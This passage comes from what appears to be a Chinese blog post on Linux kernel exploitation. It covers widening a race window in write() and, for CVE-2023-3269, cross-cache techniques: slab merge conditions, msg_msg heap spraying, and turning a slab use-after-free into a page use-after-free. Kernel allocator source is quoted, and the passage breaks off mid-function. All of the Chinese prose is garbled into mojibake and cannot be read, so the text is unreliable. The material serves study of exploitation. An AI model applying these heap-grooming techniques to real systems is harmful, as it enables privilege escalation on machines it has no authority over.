å±‚è°ƒç”¨ï¼Œ<code>write</code>ä¼šè¿›å…¥åˆ°ä¸Šè¿°å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°çš„å¼€å¤´éƒ¨åˆ†ä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å¯ä»¥å†™å…¥éšåæ‰§è¡Œ<code>file_start_write</code>ç„¶åè°ƒç”¨opsä¸­çš„<code>write</code>æœ€åæ‰§è¡Œ<code>file_end_write</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">file_start_write</span><span class="params">(struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!S_ISREG(file_inode(file)-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">sb_start_write(file_inode(file)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">file_end_write</span><span class="params">(struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!S_ISREG(file_inode(file)-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">__sb_end_write(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™ä¸ª<code>file_start_write</code>å’Œ<code>file_end_write</code>å¾ˆå®¹æ˜“çŒœå‡ºæ¥å…¶åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œå°±æ˜¯ç»™<code>write</code>åŠ ä¸Šä¸€ä¸ª<code>inode</code>é”ï¼Œå½“è¿›ç¨‹Aåœ¨å¾€ç¨‹åºä¸­å†™å…¥æ—¶è¿›ç¨‹Bä¼šè¢«é˜»å¡åœ¨<code>file_start_write</code>çš„ä½ç½®ï¼Œé‚£ä¹Ÿå°±æ„å‘³ç€è¿›ç¨‹Bå·²ç»é€šè¿‡äº†ç¨‹åºæ˜¯å¦å¯å†™çš„éªŒè¯äº†ï¼Œåªæ˜¯ç­‰å¾…è¿›ç¨‹Aå†™å®Œå°±ä¼šå¼€å§‹å†™å…¥äº†ï¼Œæ‰€ä»¥åœ¨æ­¤æœŸé—´å®ç°ä¸Šé¢çš„å·æ¢æ¢æŸ±å³å¯ï¼Œè€Œå»¶é•¿çª—å£æ—¶é—´çš„åŠæ³•å°±æ˜¯è¿›ç¨‹Aå†™å…¥å¤§é‡æ•°æ®ä½¿è¿›ç¨‹Bé˜»å¡æ—¶é—´å»¶é•¿ã€‚</p><h3 id="ç¯‡å¤–CVE-2023-3269"><a href="#ç¯‡å¤–CVE-2023-3269" class="headerlink" title="ç¯‡å¤–CVE-2023-3269"></a>ç¯‡å¤–CVE-2023-3269</h3><p>(ä¸æœ¬æ–‡æ— ç“œï¼Œè¿™é‡Œä¸»è¦ä¸¾ä¸ªcross-cacheçš„ğŸŒ°ï¼Œä»”ç»†çœ‹äº†ä¸€ä¸‹æ„Ÿè§‰è¿™ä¸ªè€ƒè™‘çš„é—®é¢˜æ¯”æ­¤ç¯‡æ–‡ç« è€ƒè™‘çš„è¦å¤šä¸€ç‚¹)</p><p>è¿™ä¸ªæ¼æ´å°±ä¸å±•å¼€è®²è¿°äº†ï¼Œå…¶æ˜¯ä¸€ä¸ªUAFæ¼æ´ï¼Œåœ¨cpu0è®¿é—®vmaæ—¶cpu1è§¦å‘<code>expand_stack</code>æ—¶æœ‰ä¸€å®šå‡ ç‡ä¼šå› ä¸º<code>expand_stack</code>é‡Šæ”¾æ‰å¯¹åº”çš„<code>maple node</code>ï¼Œè€Œå¦å¤–ä¸€è¾¹åˆ™è¿˜åœ¨è¯•å›¾è®¿é—®vmaï¼Œå½“ç„¶æ˜¯å¯ä»¥é€šè¿‡æŸç§æ–¹å¼å»¶é•¿çª—å£æ—¶é—´ï¼Œè¿™é‡Œä¸è¿‡å¤šæåˆ°ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦å®ç°ä»»æ„åœ°å€è¯»åˆ™éœ€è¦ç”¨å¯æ§çš„ç»“æ„ä½“å»å é¢†æ¯”å¦‚<code>msg_msg</code>ï¼Œå¯æƒœçš„æ˜¯æˆ‘ä»¬å•çº¯å †å–·<code>msg_msg</code>æ˜¯æ— æ³•åœ¨å†…å­˜ä¸­ç”³è¯·åˆ°å¯¹åº”çš„ä½ç½®çš„ã€‚</p><p>æ­¤æ¼æ´çš„æ”»å‡»æ–¹å¼ä»ä¸¤ä¸ªæ–¹å‘è€ƒè™‘çš„ï¼Œç¬¬ä¸€å°±æ˜¯å¼€å¯äº†<code>CONFIG_SLAB_MERGE_DEFAULT</code>é€‰é¡¹æ—¶(è¯¥é€‰é¡¹é»˜è®¤å¼€å¯)ï¼Œæ„å‘³ç€æ‰“å¼€äº†<code>slab</code>é‡ç”¨æœºåˆ¶ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹<code>slab</code>é‡ç”¨æœºåˆ¶ã€‚</p><p>åœ¨<a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >å‘pipe_bufferè¯´yesï¼<i class="fas fa-external-link-alt"></i></a>ç¯‡æ–‡ç« ä¸­è¯¦ç»†æè¿°äº†ä¸€ä¸ª<code>slab</code>çš„ç”³è¯·è¿‡ç¨‹ä½†å¹¶æ²¡æœ‰è®¨è®ºé‡ç”¨slabçš„é€‰é¡¹ï¼Œè¿™é‡Œé¦–å…ˆæä¸€ä¸‹é‡ç”¨çš„æ¡ä»¶ï¼Œåœ¨åç»­çš„ä»£ç ä¸­å¯ä»¥ä¸€ä¸€å¾—åˆ°éªŒè¯ä¾¿äºç†è§£</p><ul><li><p>  å¯¹æ–¹çš„slab cacheå’Œè‡ªå·±çš„flagéƒ½ä¸å¼€å¯SLAB_NEVER_MERGE</p></li><li><p>  å¯¹æ–¹çš„slab cacheå’Œè‡ªå·±éƒ½æ²¡æœ‰æ„é€ å‡½æ•°</p></li><li><p>  å¯¹æ–¹çš„slab cacheå’Œè‡ªå·±çš„usersizeéƒ½ä¸º0</p></li><li><p>  å¯¹æ–¹çš„slabå¤§å°å’Œè‡ªå·±çš„ç›¸åŒ</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *</span></span><br><span class="line"><span class="function"><span class="title">kmem_cache_create_usercopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">slab_flags_t</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset, <span class="keyword">unsigned</span> <span class="keyword">int</span> usersize,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *cache_name;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no slub_debug was enabled globally, the static key is not yet</span></span><br><span class="line"><span class="comment"> * enabled by setup_slub_debug(). Enable it if the cache is being</span></span><br><span class="line"><span class="comment"> * created with any of the debugging flags passed explicitly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SLAB_DEBUG_FLAGS)</span><br><span class="line">static_branch_enable(&amp;slub_debug_enabled);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;slab_mutex);</span><br><span class="line"></span><br><span class="line">err = kmem_cache_sanity_check(name, size);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Refuse requests with allocator specific flags */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~SLAB_FLAGS_PERMITTED) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some allocators will constraint the set of valid flags to a subset</span></span><br><span class="line"><span class="comment"> * of all flags. We expect them to define CACHE_CREATE_MASK in this</span></span><br><span class="line"><span class="comment"> * case, and we&#x27;ll just provide them with a sanitized version of the</span></span><br><span class="line"><span class="comment"> * passed flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">flags &amp;= CACHE_CREATE_MASK;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fail closed on bad usersize of useroffset values. */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(!usersize &amp;&amp; useroffset) ||</span><br><span class="line">    WARN_ON(size &lt; usersize || size - usersize &lt; useroffset))</span><br><span class="line">usersize = useroffset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!usersize)</span><br><span class="line">s = __kmem_cache_alias(name, size, align, flags, ctor);</span><br><span class="line"><span class="keyword">if</span> (s)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">cache_name = kstrdup_const(name, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!cache_name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = create_cache(cache_name, size,</span><br><span class="line"> calculate_alignment(flags, align, size),</span><br><span class="line"> flags, useroffset, usersize, ctor, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(s)) &#123;</span><br><span class="line">err = PTR_ERR(s);</span><br><span class="line">kfree_const(cache_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">mutex_unlock(&amp;slab_mutex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">panic(<span class="string">&quot;%s: Failed to create slab &#x27;%s&#x27;. Error %d\n&quot;</span>,</span><br><span class="line">__func__, name, err);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pr_warn(<span class="string">&quot;%s(%s) failed with error %d\n&quot;</span>,</span><br><span class="line">__func__, name, err);</span><br><span class="line">dump_stack();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmem_cache_create_usercopy);</span><br></pre></td></tr></table></figure><p>åœ¨ä»£ç ä¸­ä¼šéªŒè¯<code>usersize</code>æ˜¯å¦ä¸º0ï¼Œå¦‚æœæ˜¯åˆ™è°ƒç”¨<code>__kmem_cache_alias</code>å¯»æ‰¾å¯é‡ç”¨çš„<code>slab</code>å¦‚æœæ‰¾åˆ°äº†åˆ™ç›´æ¥é€€å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *</span></span><br><span class="line"><span class="class">__<span class="title">kmem_cache_alias</span>(<span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">align</span>,</span></span><br><span class="line"><span class="class">   <span class="title">slab_flags_t</span> <span class="title">flags</span>, <span class="title">void</span> (*<span class="title">ctor</span>)(<span class="title">void</span> *))</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">s = find_mergeable(size, align, flags, name, ctor);</span><br><span class="line"><span class="keyword">if</span> (s) &#123;</span><br><span class="line">s-&gt;refcount++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Adjust the object sizes so that we clear</span></span><br><span class="line"><span class="comment"> * the complete object on kzalloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">s-&gt;object_size = max(s-&gt;object_size, size);</span><br><span class="line">s-&gt;inuse = max(s-&gt;inuse, ALIGN(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sysfs_slab_alias(s, name)) &#123;</span><br><span class="line">s-&gt;refcount--;</span><br><span class="line">s = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›å‡½æ•°ï¼Œå¯ä»¥å‘ç°å…¶å†…éƒ¨å…¶å®å°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ª<code>find_mergeable</code>å»å¯»æ‰¾<code>slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">find_mergeable</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">slab_flags_t</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_nomerge)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctor)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">align = calculate_alignment(flags, align, size);</span><br><span class="line">size = ALIGN(size, align);</span><br><span class="line">flags = kmem_cache_flags(size, flags, name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SLAB_NEVER_MERGE)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry_reverse(s, &amp;slab_caches, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (slab_unmergeable(s))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; s-&gt;size)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; SLAB_MERGE_SAME) != (s-&gt;flags &amp; SLAB_MERGE_SAME))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if alignment is compatible.</span></span><br><span class="line"><span class="comment"> * Courtesy of Adrian Drzewiecki</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((s-&gt;size &amp; ~(align - <span class="number">1</span>)) != s-&gt;size)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;size - size &gt;= <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_SLAB) &amp;&amp; align &amp;&amp;</span><br><span class="line">(align &gt; s-&gt;align || s-&gt;align % align))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨å‡½æ•°å†…éƒ¨åˆ™ä¼šæ ¡éªŒå‰é¢æåˆ°çš„<code>flags</code>ä¸­ä¸å­˜åœ¨<code>SLAB_NEVER_MERGE</code>ï¼Œéšåéå†<code>slab_caches</code>å…¨å±€é“¾è¡¨ä½¿ç”¨<code>slab_unmergeable</code>å‡½æ•°æŸ¥çœ‹æ˜¯å¦å¯ä»¥é‡ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> slab_nomerge = !IS_ENABLED(CONFIG_SLAB_MERGE_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">slab_unmergeable</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (slab_nomerge || (s-&gt;flags &amp; SLAB_NEVER_MERGE))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;ctor)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;usersize)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We may have set a slab to be unmergeable during bootstrap.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;refcount &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šä¾æ¬¡éªŒè¯æ˜¯å¦å¼€å¯<code>CONFIG_SLAB_MERGE_DEFAULT</code>é€‰é¡¹ï¼Œ<code>flags</code>æ ‡å¿—ä½æ˜¯å¦å­˜åœ¨<code>SLAB_NERVER_MERGE</code>ï¼Œæ˜¯å¦å­˜åœ¨æ„é€ å‡½æ•°ï¼Œ<code>usersize</code>æ˜¯å¦ä¸º0ï¼Œæœ€åæ˜¯å¼•ç”¨æ¬¡æ•°å°äº0è¡¨ç¤ºè¯¥slabå‡†å¤‡é‡Šæ”¾æ— æ³•é‡ç”¨ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯<code>slab</code>é‡ç”¨çš„åŸºæœ¬æœºåˆ¶ï¼Œä»è€Œå¯ä»¥å¾—å‡ºï¼Œå¦‚æœåœ¨å¼€å¯äº†<code>CONFIG_SLAB_MERGE_DEFAULT</code>å†…æ ¸é€‰é¡¹æ—¶å­˜åœ¨<code>UAF</code>çš„<code>maple node</code>æ‰€åœ¨çš„<code>slab</code>æ˜¯ä¼šè¿›å…¥åˆ°é‡ç”¨é“¾è¡¨ä¸­å–å¾—ï¼Œè€Œåå¯ä»¥ä½¿ç”¨<code>msg_msg</code>ç»“æ„ä½“å †å–·ç›¸åŒå¤§å°ä»è€Œåˆ†é…åˆ°<code>UAF</code>çš„<code>maple node</code>ä¸Šå»çš„ã€‚ä½†æ˜¯åŸæ–‡é‡ç‚¹è®²è¿°äº†åœ¨æ²¡æœ‰å¼€å¯<code>CONFIG_SLAB_MERGE_DEFAULT</code>é€‰é¡¹æ—¶å¦‚ä½•è§£å†³ã€‚</p><p>é¦–å…ˆç°åœ¨çš„å¾ˆå¤šè®¡ç®—æœºé‡‡ç”¨çš„æ—¶<code>NUMA</code>æ¶æ„ï¼Œæ„å‘³ç€å¯¹äºæ¯ä¸ªCPUæ¥è¯´æ˜¯å­˜åœ¨ä¸¤æ¡é“¾è¡¨æ¥å­˜æ”¾è¢«é‡Šæ”¾çš„slabï¼Œé¦–å…ˆæ˜¯<code>cpu_slab</code>å’Œ<code>NODE</code>çš„<code>partial list</code>ï¼Œåˆå› ä¸ºä¸å­˜åœ¨<code>CONFIG_SLAB_MERGE_DEFAULT</code>é€‰é¡¹çš„å…³ç³»ï¼Œè¢«é‡Šæ”¾çš„slabæ˜¯æ— æ³•è¢«ç”³è¯·é‡ç”¨çš„æ‰€ä»¥è¿™é‡Œéœ€è¦å°†<code>slab UAF</code>è½¬åŒ–ä¸º<code>page UAF</code>ã€‚</p><p>åŸæ–‡åœ¨è¿™é‡Œä½¿ç”¨çš„æ–¹å¼æ˜¯é€šè¿‡<code>clone</code>/<code>fork</code>å¤§é‡è¿›ç¨‹æ¥ç”³è¯·å¤§é‡ç›¸åŒçš„<code>vma</code>æ ‘ï¼Œç„¶åè®©ä¸€ä¸ª<code>slab</code>ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¸ºæˆ‘ä»¬çš„<code>maple node</code>ï¼Œæ­¤æ—¶å¯ä»¥é‡Šæ”¾æ‰æ¯ä¸ª<code>slab</code>çš„å¤šä½™çš„å†…å®¹åªç•™ä¸‹ä¸€ä¸ª<code>object</code>ï¼Œæœ€åè§¦å‘æ¼æ´ï¼Œä½¿å…¶ä¹Ÿè¢«é‡Šæ”¾æ‰ã€‚å› ä¸ºä¸€æ•´ä¸ª<code>slab</code>ä¸Šçš„æ‰€æœ‰å¯¹è±¡éƒ½è¢«é‡Šæ”¾æ‰äº†ï¼Œä¹Ÿå°±æ„å‘³ç€æ­¤<code>slab</code>ä¼šè¢«å¼ºåˆ¶é‡Šæ”¾ï¼Œéšåä¼šè¿›å…¥<code>cpu_slab</code>ï¼Œå¦‚æœæˆ‘ä»¬å‰é¢ç”³è¯·çš„å¤§é‡ç›¸åŒè¿›ç¨‹å¯¼è‡´å…¶æ»¡äº†åˆ™ä¼šè¿›å…¥<code>node</code>çš„<code>partial list</code>å¦‚æœä¹Ÿæ»¡äº†åˆ™ä¼šè¿›å…¥é”€æ¯<code>slab</code>çš„æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __slab_free(struct kmem_cache *s, struct page *page,</span><br><span class="line"><span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">int</span> cnt,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *prior;</span><br><span class="line"><span class="keyword">int</span> was_frozen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line"><span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Objects left in the slab. If it was not on the partial list before</span></span><br><span class="line"><span class="comment"> * then add it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; 